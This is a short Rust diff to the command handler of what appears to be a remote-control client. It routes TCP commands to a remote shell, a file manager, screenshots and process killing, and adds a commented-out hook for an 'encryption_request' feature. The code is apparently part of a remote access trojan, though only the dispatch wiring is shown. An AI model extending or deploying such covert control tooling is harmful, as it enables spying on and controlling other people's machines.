@@ -8,6 +8,7 @@ use crate::features::file_manager::file_manager;
 use crate::features::system_commands::system_commands;
 use crate::features::other::{take_screenshot, client_info};
 use crate::features::process::{process_list, kill_process};
+use crate::features::encryption::encryption_request;
 
 pub fn handle_command(write_stream: &mut TcpStream, command: &str, remote_shell: &mut Option<Child>, current_path: &mut PathBuf) {
     match command {
@@ -18,6 +19,7 @@ pub fn handle_command(write_stream: &mut TcpStream, command: &str, remote_shell:
         "available_disks" | "previous_dir" => {
             file_manager(write_stream, current_path, command);
         },
+        // _ if command.starts_with("encryption_request") => encryption_request(write_stream, &command["encryption_request::".len()..]),
         "init_client" => client_info(write_stream),
         _ if command.starts_with("take_screenshot") => {
             let display = command["take_screenshot::".len()..].parse::<i32>().unwrap();
